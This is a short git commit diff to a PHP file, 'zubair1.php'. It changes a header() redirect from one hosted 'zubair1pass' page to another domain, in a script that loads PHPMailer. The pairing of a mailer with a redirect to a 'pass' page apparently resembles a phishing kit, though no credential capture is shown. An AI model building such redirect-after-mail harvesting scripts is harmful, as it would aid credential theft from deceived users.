9776177f5eb546be6653a94e87e35b60224a5765
asif1012-lgtm <hpboost8@gmail.com>
2025-08-09 09:18:03 +0500

    Update zubair1.php

--- zubair1.php
+++ zubair1.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://zubair1pass.vercel.app/");
+header("Location:https://zubair1pass-slk1zein28.edgeone.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
